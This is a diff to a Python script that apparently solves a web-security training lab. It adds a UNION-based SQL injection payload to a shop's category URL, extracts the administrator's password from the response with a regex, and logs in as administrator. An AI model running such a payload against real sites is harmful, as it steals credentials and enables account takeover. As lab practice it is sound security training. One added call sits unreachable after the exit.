@@ -2,7 +2,7 @@ import sys
 import logging
 import urllib3
 import requests
-
+import re
 import utils
 from shop import Shop
 
@@ -61,16 +61,24 @@ def determine_text_columns(url, no_proxy, num_columns):
 
 
 def main(args):
-    shop = Shop(args.url, args.no_proxy)
+    session = requests.Session()
+    shop = Shop(args.url, args.no_proxy, session)
     num_columns = determine_number_of_columns(shop.category_url, shop.no_proxy)
     if not num_columns:
         log.error("Couldn't determine number of columns. Exiting")
         sys.exit(-1)
-    
-    
-    
-    
-    
+        determine_text_columns(shop.category_url, shop.no_proxy, num_columns)
+    category = "' UNION SELECT username,password from users-- "
+    exploit_url = shop.category_url + category
+    if args.no_proxy:
+        resp = requests.get(exploit_url)
+    else:
+        resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
+    pattern = r"<th>administrator</th>.*?<td>(.*?)</td>"
+    m = re.search(pattern, resp.text, flags=re.M | re.DOTALL)
+    password = m[1]
+    shop.login("administrator", password)
+    shop.is_solved()
     
     
 if __name__ == "__main__":
